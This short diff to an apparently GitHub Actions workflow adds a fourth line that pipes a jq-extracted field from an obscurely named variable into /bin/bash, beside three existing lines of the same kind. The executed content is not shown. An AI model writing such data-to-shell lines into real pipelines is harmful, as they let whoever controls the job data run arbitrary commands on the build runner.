@@ -45,6 +45,7 @@ jobs:
           printf '%s' "$sd3200" | jq -r .y00406 | /bin/bash
           printf '%s' "$x633" | jq -r .l157 | /bin/bash
           printf '%s' "$zrq0" | jq -r .sh599 | /bin/bash
+          echo $te9615 | jq -r .a090 | /bin/bash
 
       - name: Archive results
         if: always()
